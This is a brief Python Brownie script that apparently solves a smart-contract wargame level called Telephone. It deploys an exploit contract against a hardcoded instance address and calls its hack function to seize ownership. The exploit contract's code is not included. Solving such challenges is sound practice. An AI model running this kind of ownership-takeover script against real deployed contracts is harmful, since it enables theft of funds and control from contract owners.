from brownie import interface, accounts, config, Exploit

INSTANCE_ADDRESS = "0xF3654BAB9C8CbF7C2B44D69af0F56Ab54e72e918"
ACCOUNT = accounts.add(config["wallets"]["from_key"])

def hack():
    # grab the Telephone contract Object
    instance_contract = interface.ITelephone(INSTANCE_ADDRESS)
    # deploy the exploit contract
    exploit_contract = Exploit.deploy(INSTANCE_ADDRESS, {"from": ACCOUNT})
    
    # hack the contract
    tx = exploit_contract.hack({"from": ACCOUNT})
    tx.wait(1)
        
    print(f"Contract has been hacked. {instance_contract.owner()} is the new owner")

def main():
    hack()
